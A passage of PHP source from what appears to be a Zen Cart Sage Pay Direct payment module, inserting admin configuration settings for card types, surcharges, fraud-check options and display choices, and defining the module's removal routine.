		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Encryption Keyphrase', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ENCRYPTION_KEYPHRASE', 'Enter a random encryption keyphrase here!', 'The keyphrase to be used to encrypt the Card details if they are to be (temporarily) stored in the session.<br /><br />This keyphrase can be <strong>any</strong> random text string, just make one up.', '6', '0', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('AVS (Address Verification) Options', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_AVS_SETTINGS', 'If AVS/CV2 enabled then check them. If rules apply, use rules. (Default)', 'How should the AVS and CV2 rules for the Sage Pay Go account being used be applied? (Consult Sage Pay documentation for an explanation).', '6', '0', 'zen_cfg_select_option(array(\'If AVS/CV2 enabled then check them. If rules apply, use rules. (Default)\', \'Force AVS/CV2 checks even if not enabled for the account. If rules apply, use rules.\', \'Force NO AVS/CV2 checks even if enabled on account.\', \'Force AVS/CV2 checks even if not enabled for the account but DO NOT apply any rules.\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('3D-Secure Options', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_3D_SECURE_SETTINGS', 'If 3D-Secure checks are possible and rules allow, perform the checks and apply the authorisation rules. (Default)', 'How should the 3D-Secure rules for the Sage Pay Go account being used be applied? (Consult Sage Pay documentation for an explanation).', '6', '0', 'zen_cfg_select_option(array(\'If 3D-Secure checks are possible and rules allow, perform the checks and apply the authorisation rules. (Default)\', \'Force 3D-Secure checks (if your account is 3D-enabled) and apply rules for authorisation.\', \'Do not perform 3D-Secure checks, even if enabled on account - always authorise.\', \'Force 3D-Secure checks (if your account is 3D-enabled) but ALWAYS obtain an auth code, irrespective of rule base.\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Disable Autocomplete for Card Number field', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_DISABLE_CARD_NUMBER_AUTOCOMPLETE', 'Yes', 'Should the autocomplete functionality of certain browsers be disabled for the Card Number field? (This prevents the browser from automatically entering the customer\'s Card Number).', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Disable Autocomplete for CVV field (if CVV enabled!)', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_DISABLE_CVV_AUTOCOMPLETE', 'Yes', 'Should the autocomplete functionality of certain browsers be disabled for the CVV field? (This prevents the browser from automatically entering the customer\'s CVV Number).', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		
		
		// Card configuration values ///////////////////////////////////////////////////////////////
		$background_colour = '#d0d0d0';
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('</b></fieldset><fieldset style=\"background: " . $background_colour . "; margin-bottom: 1.5em;\"><legend style=\"font-size: 1.4em; font-weight: bold\">Card Type Configs</legend><b>Visa Card Payments', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_VISA', 'Yes', 'Does the store accept Visa Card payments?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Visa Card Surcharges/Discounts', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_VISA', '', 'If there are surcharge(s) or discount(s) for Visa Card payments, a Rate or a Table of Rates should be entered here.', '6', '0', now())");
		
		// Language text for Visa Surcharges/Discounts
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Short Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_VISA_SHORT_" . $languages[$i]['id'] . "', '', 'Short Descriptive Text to be added after card\'s title in the Card Type selection gadget (E.g. &ldquo;2% Surcharge&rdquo;)', '6', '0', now())");
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Long Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_VISA_LONG_" . $languages[$i]['id'] . "', '', 'Longer Descriptive Text for Order Total Summary Line (E.g. &ldquo;Visa Card Surcharge @ 2%&rdquo;)', '6', '0', now())");
		}
		
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('</b><hr /><b>MasterCard Card Payments', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_MC', 'Yes', 'Does the store accept MasterCard Card payments?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('MasterCard Card Surcharges/Discounts', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_MC', '', 'If there are surcharge(s) or discount(s) for MasterCard Card payments, a Rate or a Table of Rates should be entered here.', '6', '0', now())");
		
		// Language text for MasterCard Surcharges/Discounts
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Short Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_MC_SHORT_" . $languages[$i]['id'] . "', '', 'Short Descriptive Text to be added after card\'s title in the Card Type selection gadget (E.g. &ldquo;2% Surcharge&rdquo;)', '6', '0', now())");
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Long Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_MC_LONG_" . $languages[$i]['id'] . "', '', 'Longer Descriptive Text for Order Total Summary Line (E.g. &ldquo;MasterCard Card Surcharge @ 2%&rdquo;)', '6', '0', now())");
		}
		
		// Code for "Visa Debit" is "DELTA"
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('</b><hr /><b>Visa Debit Card Payments', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_VISA_DEBIT', 'Yes', 'Does the store accept Visa Debit Card payments?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Visa Debit Card Surcharges/Discounts', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_DELTA', '', 'If there are surcharge(s) or discount(s) for Visa Debit Card payments, a Rate or a Table of Rates should be entered here. <br /><br />Please Note: Most policies forbid surcharges for debit cards!', '6', '0', now())");
		
		// Language text for Visa Debit Surcharges/Discounts
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Short Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_DELTA_SHORT_" . $languages[$i]['id'] . "', '', 'Short Descriptive Text to be added after card\'s title in the Card Type selection gadget (E.g. &ldquo;&pound;0.50 Discount&rdquo;)', '6', '0', now())");
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Long Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_DELTA_LONG_" . $languages[$i]['id'] . "', '', 'Longer Descriptive Text for Order Total Summary Line (E.g. &ldquo;Visa Debit Card Discount&rdquo;)', '6', '0', now())");
		}
		
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('</b><hr /><b>Solo Card Payments', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_SOLO', 'Yes', 'Does the store accept Solo Card payments?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Solo Card Surcharges/Discounts', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_SOLO', '', 'If there are surcharge(s) or discount(s) for Solo Card payments, a Rate or a Table of Rates should be entered here. <br /><br />Please Note: Most policies forbid surcharges for debit cards!', '6', '0', now())");
		
		// Language text for Solo Surcharges/Discounts
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Short Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_SOLO_SHORT_" . $languages[$i]['id'] . "', '', 'Short Descriptive Text to be added after card\'s title in the Card Type selection gadget (E.g. &ldquo;&pound;0.50 Discount&rdquo;)', '6', '0', now())");
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Long Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_SOLO_LONG_" . $languages[$i]['id'] . "', '', 'Longer Descriptive Text for Order Total Summary Line (E.g. &ldquo;Solo Card Discount&rdquo;)', '6', '0', now())");
		}
		
		// Code for "Maestro" is "MAESTRO"
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('</b><hr /><b>Maestro Card Payments', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_MAESTRO', 'Yes', 'Does the store accept Maestro Card payments?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Maestro Card Surcharges/Discounts', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_MAESTRO', '', 'If there are surcharge(s) or discount(s) for Maestro Card payments, a Rate or a Table of Rates should be entered here. <br /><br />Please Note: Most policies forbid surcharges for debit cards!', '6', '0', now())");
		
		// Language text for Maestro Surcharges/Discounts
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Short Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_MAESTRO_SHORT_" . $languages[$i]['id'] . "', '', 'Short Descriptive Text to be added after card\'s title in the Card Type selection gadget (E.g. &ldquo;&pound;0.50 Discount&rdquo;)', '6', '0', now())");
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Long Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_MAESTRO_LONG_" . $languages[$i]['id'] . "', '', 'Longer Descriptive Text for Order Total Summary Line (E.g. &ldquo;Maestro Card Discount&rdquo;)', '6', '0', now())");
		}
		
		// Code for "Visa Electon" is "UKE"
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('</b><hr /><b>Visa Electron (UKE) Card Payments', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_VISA_ELECTRON', 'Yes', 'Does the store accept Visa Electron Card payments?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Visa Electron Card Surcharges/Discounts', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_UKE', '', 'If there are surcharge(s) or discount(s) for Visa Electron Card payments, a Rate or a Table of Rates should be entered here. <br /><br />Please Note: Most policies forbid surcharges for debit cards!', '6', '0', now())");
		
		// Language text for Visa Electron Surcharges/Discounts
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Short Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_UKE_SHORT_" . $languages[$i]['id'] . "', '', 'Short Descriptive Text to be added after card\'s title in the Card Type selection gadget (E.g. &ldquo;&pound;0.50 Discount&rdquo;)', '6', '0', now())");
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Long Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_UKE_LONG_" . $languages[$i]['id'] . "', '', 'Longer Descriptive Text for Order Total Summary Line (E.g. &ldquo;Visa Electron Card Discount&rdquo;)', '6', '0', now())");
		}
		
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('</b><hr /><b>American Express Card Payments', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_AMEX', 'No', 'Does the store accept American Express Card payments?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('American Express Card Surcharges/Discounts', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_AMEX', '', 'If there are surcharge(s) or discount(s) for American Express Card payments, a Rate or a Table of Rates should be entered here.', '6', '0', now())");
		
		// Language text for American Express Surcharges/Discounts
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Short Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_AMEX_SHORT_" . $languages[$i]['id'] . "', '', 'Short Descriptive Text to be added after card\'s title in the Card Type selection gadget (E.g. &ldquo;4% Surcharge&rdquo;)', '6', '0', now())");
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Long Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_AMEX_LONG_" . $languages[$i]['id'] . "', '', 'Longer Descriptive Text for Order Total Summary Line (E.g. &ldquo;American Express Card Surcharge @ 4%&rdquo;)', '6', '0', now())");
		}
		
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('</b><hr /><b>Diners Club Card Payments', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_DC', 'No', 'Does the store accept Diners Club Card payments?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Diners Club Card Surcharges/Discounts', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_DC', '', 'If there are surcharge(s) or discount(s) for Diners Club Card payments, a Rate or a Table of Rates should be entered here.', '6', '0', now())");
		
		// Language text for Diners Club Surcharges/Discounts
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Short Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_DC_SHORT_" . $languages[$i]['id'] . "', '', 'Short Descriptive Text to be added after card\'s title in the Card Type selection gadget (E.g. &ldquo;2% Surcharge&rdquo;)', '6', '0', now())");
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Long Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_DC_LONG_" . $languages[$i]['id'] . "', '', 'Longer Descriptive Text for Order Total Summary Line (E.g. &ldquo;Diners Club Card Surcharge @ 2%&rdquo;)', '6', '0', now())");
		}
		
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('</b><hr /><b>JCB Card Payments', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_JCB', 'No', 'Does the store accept JCB Card payments?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('JCB Card Surcharges/Discounts', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_JCB', '', 'If there are surcharge(s) or discount(s) for JCB Card payments, a Rate or a Table of Rates should be entered here.', '6', '0', now())");
		
		// Language text for JCB Surcharges/Discounts
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Short Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_JCB_SHORT_" . $languages[$i]['id'] . "', '', 'Short Descriptive Text to be added after card\'s title in the Card Type selection gadget (E.g. &ldquo;2% Surcharge&rdquo;)', '6', '0', now())");
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Long Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_JCB_LONG_" . $languages[$i]['id'] . "', '', 'Longer Descriptive Text for Order Total Summary Line (E.g. &ldquo;JCB Card Surcharge @ 2%&rdquo;)', '6', '0', now())");
		}
		
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('</b><hr /><b>Laser Card Payments', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ACCEPT_LASER', 'No', 'Does the store accept Laser Card payments?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Laser Card Surcharges/Discounts', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_LASER', '', 'If there are surcharge(s) or discount(s) for Laser Card payments, a Rate or a Table of Rates should be entered here.', '6', '0', now())");
		
		// Language text for Laser Surcharges/Discounts
		for ($i = 0, $n = sizeof($languages); $i < $n; $i++) {
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Short Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_LASER_SHORT_" . $languages[$i]['id'] . "', '', 'Short Descriptive Text to be added after card\'s title in the Card Type selection gadget (E.g. &ldquo;&pound;0.50 Discount&rdquo;)', '6', '0', now())");
			$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('" . zen_image(DIR_WS_CATALOG_LANGUAGES . $languages[$i]['directory'] . '/images/' . $languages[$i]['image'], $languages[$i]['name']) . "&nbsp;Long Text', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SURCHARGES_DISCOUNTS_LASER_LONG_" . $languages[$i]['id'] . "', '', 'Longer Descriptive Text for Order Total Summary Line (E.g. &ldquo;Laser Card Discount&rdquo;)', '6', '0', now())");
		}
		
		
		// Display configuration values ////////////////////////////////////////////////////////////
		$background_colour = '#eee';
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('</b></fieldset><fieldset style=\"background: " . $background_colour . "; margin-bottom: 1.5em;\"><legend style=\"font-size: 1.4em; font-weight: bold\">Display Options</legend><b>Show icons of Cards Accepted', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SHOW_CARDS_ACCEPTED', 'Yes', 'Should icons be shown for each Credit/Debit Card accepted?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Start/Expiry Month Format', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SELECT_MONTH_FORMAT', '%m - %B', 'A valid strftime format code should be entered here, to be used within the Start and Expiry Date Month Selection gadgets.', '6', '0', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Start/Expiry Year Format', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SELECT_YEAR_FORMAT', '%Y', 'A valid strftime format code should be entered here, to be used within the Start and Expiry Date Year Selection gadgets.', '6', '0', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Show Sage Pay Logo in Cards Accepted Sidebox', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_CARDS_ACCEPTED_SIDEBOX_SHOW_SAGE_PAY_LOGO', 'Yes', 'Should the logo for Sage Pay be shown in the Cards Accepted Sidebox?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Show Protx Logo in Cards Accepted Sidebox', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_CARDS_ACCEPTED_SIDEBOX_SHOW_PROTX_LOGO', 'Yes', 'Should the logo for Protx (now Sage Pay) be shown in the Cards Accepted Sidebox?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('Show Message about Surcharges/Discounts', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_ENABLE_CUSTOM_SURCHARGES_DISCOUNTS_MESSAGE', 'Yes', 'If using the Surcharges/Discounts functionality, it may prove beneficial to give the customer a bit of information about the store\'s policy.<br /><br />If this option is enabled then the message defined in the Languages Definition file will be displayed immediately above the Card Type selection gadget.<br /><br />Should this message be displayed?', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, date_added) values ('Sort Order of Display.', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_SORT_ORDER', '0', 'The Sort Order of Display determines what order the installed payment modules are displayed in. The module with the lowest Sort Order is displayed first (towards the top). No two payment modules can have the same sort order, unless all are using \'0\'.', '6', '0', now())");
		
		
		// Miscellaneous options ///////////////////////////////////////////////////////////////////
		$background_colour = '#d0d0d0';
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('</b></fieldset><fieldset style=\"background: " . $background_colour . "; margin-bottom: 1.5em;\"><legend style=\"font-size: 1.4em; font-weight: bold\">Misc. Options</legend><b>Enable Debugging Output', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_DEBUGGING_ENABLED', 'No', 'When enabled, this option will cause the Cart to stop after attempting to complete the transaction with Sage Pay. The data sent and received will be output instead of the Checkout Success or Failure (Payment) page.<br /><br />DON\'T ENABLE UNLESS YOU KNOW WHAT YOU ARE DOING!', '6', '0', 'zen_cfg_select_option(array(\'Yes\', \'No\'), ', now())");
		$db->Execute("insert into " . TABLE_CONFIGURATION . " (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, set_function, date_added) values ('</b></fieldset><img src=\"" . DIR_WS_ADMIN . DIR_WS_IMAGES . "ceon_button_logo.png\" alt=\"Made by Ceon. &copy; 2006-2009 Ceon\" align=\"right\" style=\"margin: 1em 0.2em;\"/><br />Module &copy; 2006-2009 Ceon<p style=\"display: none\">', 'MODULE_PAYMENT_SAGE_PAY_DIRECT_MADE_BY_CEON', '" . $this->version . "', '', '6', '0', 'zen_draw_hidden_field(\'made_by_ceon\' . ', now())");
	}

	function remove()
	{
		global $db;
		
		$db->Execute("delete from " . TABLE_CONFIGURATION . " where configuration_key in ('" .
			implode("', '", $this->keys()) . "')");
	}

	function keys()
	{
		$languages = zen_get_languages();
		
		$keys = array(
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_STATUS',
			'MODULE_PAYMENT_SAGE_PAY_DIRECT_VENDOR_NAME',
